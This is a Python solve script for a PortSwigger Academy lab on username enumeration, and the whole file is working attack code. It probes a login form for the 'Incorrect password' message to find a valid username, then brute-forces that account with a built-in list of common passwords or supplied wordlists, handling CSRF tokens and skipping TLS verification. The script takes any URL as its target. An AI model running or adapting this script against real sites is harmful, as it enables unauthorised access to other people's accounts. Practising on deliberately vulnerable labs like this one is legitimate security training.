#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Username enumeration via different responses.

Phase 1: enumerate username by checking for 'Incorrect password' response.
Phase 2: brute-force password for the confirmed username.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAMES = [
    "carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
    "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
    "accware","action","addresses","adkit","admin2","admins","agentsmith","aid","aidan"
]

PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
    "dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman",
    "1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan",
    "jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew",
    "tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger"
]


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def enumerate_username(session: requests.Session, lab: str, usernames: list[str]) -> str:
    for username in usernames:
        csrf = get_csrf(session, f"{lab}/login")
        r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": "dummy"})
        if "Incorrect password" in r.text:
            print(f"[+] Valid username found: {username}")
            return username
    raise SystemExit("[-] No valid username found")


def brute_password(session: requests.Session, lab: str, username: str, passwords: list[str]) -> str:
    for password in passwords:
        csrf = get_csrf(session, f"{lab}/login")
        r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password},
                         allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Password found: {password}")
            return password
    raise SystemExit("[-] Password not found in wordlist")


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 1 (username enum via different responses)")
    parser.add_argument("lab_url")
    parser.add_argument("--userlist", help="Path to username wordlist (one per line)")
    parser.add_argument("--passlist", help="Path to password wordlist (one per line)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    usernames = open(args.userlist).read().splitlines() if args.userlist else USERNAMES
    passwords = open(args.passlist).read().splitlines() if args.passlist else PASSWORDS

    username = enumerate_username(s, lab, usernames)
    password = brute_password(s, lab, username, passwords)

    csrf = get_csrf(s, f"{lab}/login")
    r = s.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    print(f"[+] Logged in as {username} — status {r.status_code}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
